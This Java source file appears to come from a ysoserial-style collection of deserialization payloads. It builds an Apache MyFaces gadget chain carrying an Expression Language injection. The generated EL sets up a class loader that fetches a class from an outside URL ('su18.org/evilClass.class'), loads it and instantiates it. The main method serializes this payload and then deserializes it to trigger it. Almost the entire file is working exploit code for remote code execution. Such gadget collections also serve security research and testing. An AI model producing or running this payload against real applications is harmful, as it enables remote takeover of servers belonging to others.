package org.su18.serialize.ysoserial.Myfaces.Myfaces2;

import org.su18.serialize.ysoserial.Myfaces.Myfaces1.Myfaces1;
import org.su18.serialize.utils.SerializeUtil;

/**
 * 来源 http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
 *
 * @author su18
 */
public class Myfaces2 {

	public static String generateELs() {

		String url       = "https://su18.org/evilClass.class";
		String className = "SomeEvilClass";

		StringBuilder expr = new StringBuilder("${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}");

		// if we add fewer than the actual classloaders we end up with a null entry
		for (int i = 0; i < 100; i++) {
			expr.append("${request.getAttribute('arr').add(request.servletContext.getResource('/').toURI().create('").append(url).append("').toURL())}");
		}
		expr.append("${request.getClass().getClassLoader().newInstance(request.getAttribute('arr')" +
						".toArray(request.getClass().getClassLoader().getURLs())).loadClass('").append(className)
				.append("').newInstance()}");

		return expr.toString();
	}


	public static void main(String[] args) throws Exception {
		SerializeUtil.writeObjectToFile(Myfaces1.generatePayload(generateELs()));
		SerializeUtil.readFileObject();
	}


}
